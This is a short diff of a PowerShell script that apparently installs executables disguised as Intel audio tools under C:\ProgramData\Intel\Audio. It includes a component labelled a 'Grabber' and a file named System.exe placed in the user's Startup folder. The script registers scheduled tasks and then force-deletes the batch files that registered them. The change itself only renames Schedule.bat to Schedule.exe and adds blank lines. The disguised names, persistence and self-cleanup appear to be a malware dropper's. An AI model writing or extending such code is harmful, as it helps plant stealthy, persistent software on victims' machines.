@@ -4,7 +4,7 @@ $TargetPath     = "C:\ProgramData\Intel\Audio"
 $TargetZip      = "$TargetPath\audiotools.zip"
 $TargetFile     = "$TargetPath\AudioTools.exe"
 $TargetGrabber  = "$TargetPath\Notify.exe"
-$TargetSchedule = "$TargetPath\Schedule.bat"
+$TargetSchedule = "$TargetPath\Schedule.exe"
 $TargetSystem   = "$env:APPDATA\Microsoft\Windows\StartMenu\Programs\Startup\System.exe"
 $TargetSBat     = "$TargetPath\Register_Schedule.bat"
 $TargetABat     = "$TargetPath\Register_AudioTools.bat"
@@ -51,6 +51,8 @@ if (Get-ScheduledTask -TaskName "Schedule" -ErrorAction SilentlyContinue) {
 } else {
   & $TargetSBat
 }
+
+
 
 Remove-Item -Path $TargetPath\Register_AudioTools.bat -Force
 Remove-Item -Path $TargetPath\Register_Notify.bat -Force
